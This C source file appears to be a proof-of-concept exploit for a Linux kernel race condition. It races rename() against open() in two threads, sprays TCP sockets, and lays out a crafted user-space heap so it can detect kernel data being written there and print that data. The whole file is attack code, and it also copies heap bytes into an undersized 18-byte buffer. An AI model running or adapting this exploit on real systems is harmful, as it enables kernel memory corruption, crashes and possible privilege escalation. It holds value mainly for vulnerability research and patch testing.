#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
void *callrename( void *ptr );
void *openclose( void *ptr );
pthread_t thread1, thread2;
int lastfd;
char *space;
int original,printed;
main()
{ 
     int  iret1, iret2,i;
     printed=0;
     space=malloc(2048);
     int *int_space=space;
     for (i=0;i<63;i++)
     {
     	int_space[8*i]=(int)(space+32*i+32);
     }
     printf("A malloced heap in user space: 0x%08x\nPress Enter to continue\n",space);
     getchar();
     original=*(int*)(space+32);
     setvbuf(stdout,0,2,0);
     for (i=0;i<120;i++)
     {
        int fd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
     }

     iret1 = pthread_create( &thread1, NULL, callrename, &space);
     if(iret1)
     {
         fprintf(stderr,"Error - pthread_create() return code: %d\n",iret1);
         exit(EXIT_FAILURE);
     }
     iret2 = pthread_create( &thread2, NULL, openclose, &space);
     if(iret2)
     {
         fprintf(stderr,"Error - pthread_create() return code: %d\n",iret2);
         exit(EXIT_FAILURE);
     }
     pthread_join( thread1, NULL);
     pthread_join( thread2, NULL); 
     exit(EXIT_SUCCESS);
}
void *callrename( void *ptr )
{
    int i,m;
    char longname[18];
    strcpy(longname,"test_dir/aaaa");
    strcat(longname,space);
    for (i=0;i<1000;i++)
    {
if(original!=*(int*)(space+32))
     {  printf("Kernel data written on user heap:\nAddress start from: 0x%p\n",space+32);
        for (m=0;m<10;m++)
        {

            printf("0x%08x\n",*(int*)(space+32+m*8));
        }
        break;
     }
     rename("test_dir/f",longname);
     rename(longname,"test_dir/f");
    }
    ;
}
void *openclose( void *ptr )
{
    int j,fd,m;
    for (j=0;j<4000;j++)
    {
    	if(original!=*(int*)(space+32))
     {
        if (printed==0)
        {
            printed=1;
     	for (m=0;m<10;m++)
     	{
     		printf("0x%08x\n",*(int*)(space+32+m*8));
     	}}
     	break;
     }
    //fd=open("test_dir/f",O_RDWR);
    fd=open("test_dir/f",O_RDWR);
    if (fd!=-1)
    {
    	if(original!=*(int*)(space+32))
     {  printf("Kernel data written on user heap:\nAddress start from: 0x%p\n",space+32);
     	for (m=0;m<10;m++)
     	{

     		printf("0x%08x\n",*(int*)(space+32+m*8));
     	}
     	break;
     }
    }
    }
    printf("Exiting\n");
}